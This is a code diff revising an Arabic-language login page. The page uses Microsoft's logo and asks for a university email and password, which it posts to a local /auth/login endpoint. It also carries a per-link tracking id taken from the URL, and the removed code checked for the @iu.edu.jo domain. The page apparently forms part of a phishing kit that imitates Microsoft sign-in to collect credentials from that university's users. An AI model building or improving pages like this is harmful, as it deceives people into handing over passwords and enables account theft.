@@ -32,21 +32,22 @@
       position: relative;
       margin: 10px 0;
     }
-    .input-group input {
+    .form-control {
       width: 100%;
-      padding: 10px 35px 10px 10px;
+      padding: 10px 40px 10px 10px;
       border: 1px solid #ccc;
       border-radius: 4px;
-      text-align: left;
+      font-size: 14px;
       direction: ltr;
     }
-    .input-group .icon {
+    .input-icon {
       position: absolute;
-      right: 10px;
       top: 50%;
+      right: 10px;
       transform: translateY(-50%);
-      font-size: 16px;
       color: #666;
+      font-size: 16px;
+      cursor: pointer;
     }
     button {
       background: #0067b8;
@@ -62,69 +63,52 @@
     button:hover {
       background: #005a9e;
     }
-    .error {
-      color: red;
-      margin-top: 10px;
+    .forgot {
+      margin-top: 15px;
       font-size: 14px;
     }
-    .link {
-      margin-top: 15px;
-      display: block;
+    .forgot a {
       color: #0067b8;
       text-decoration: none;
-      font-size: 14px;
+    }
+    .forgot a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
     <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
-    <h2 id="title">تسجيل الدخول باستخدام بريدك الجامعي</h2>
-
-    <!-- الخطوة الأولى: البريد -->
-    <div id="step1">
+    <h2>تسجيل الدخول بإستخدام بريدك الجامعي</h2>
+    <form action="/auth/login" method="POST">
       <div class="input-group">
-        <span class="icon">@</span>
-        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+        <input type="email" name="email" class="form-control" placeholder="البريد الإلكتروني" required>
+        <span class="input-icon">@</span>
       </div>
-      <button onclick="nextStep()">التالي</button>
-      <div id="error1" class="error"></div>
-    </div>
-
-    <!-- الخطوة الثانية: كلمة المرور -->
-    <form id="step2" action="/auth/login" method="POST" style="display:none;">
       <div class="input-group">
-        <span class="icon">🔑</span>
-        <input type="password" name="password" placeholder="كلمة المرور" required>
+        <input type="password" id="password" name="password" class="form-control" placeholder="كلمة المرور" required>
+        <span class="input-icon" onclick="togglePassword()">👁</span>
       </div>
-      <input type="hidden" id="finalEmail" name="email">
       <input type="hidden" id="linkId" name="id">
       <button type="submit">تسجيل الدخول</button>
-      <a href="#" class="link">هل نسيت كلمة المرور؟</a>
     </form>
+    <div class="forgot">
+      <a href="#">هل نسيت كلمة المرور؟</a>
+    </div>
   </div>
 
   <script>
+    // قراءة id من الرابط
     const params = new URLSearchParams(window.location.search);
     const linkId = params.get('id');
     if (linkId) {
       document.getElementById('linkId').value = linkId;
     }
 
-    function nextStep() {
-      const email = document.getElementById('email').value.trim();
-      const error1 = document.getElementById('error1');
-
-      if (!email.endsWith('@iu.edu.jo')) {
-        error1.textContent = '❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo';
-        return;
-      }
-
-      // إذا البريد صحيح → الانتقال للخطوة الثانية
-      document.getElementById('finalEmail').value = email;
-      document.getElementById('step1').style.display = 'none';
-      document.getElementById('step2').style.display = 'block';
-      document.getElementById('title').textContent = email;
+    // إظهار/إخفاء كلمة المرور
+    function togglePassword() {
+      const passField = document.getElementById("password");
+      passField.type = passField.type === "password" ? "text" : "password";
     }
   </script>
 </body>
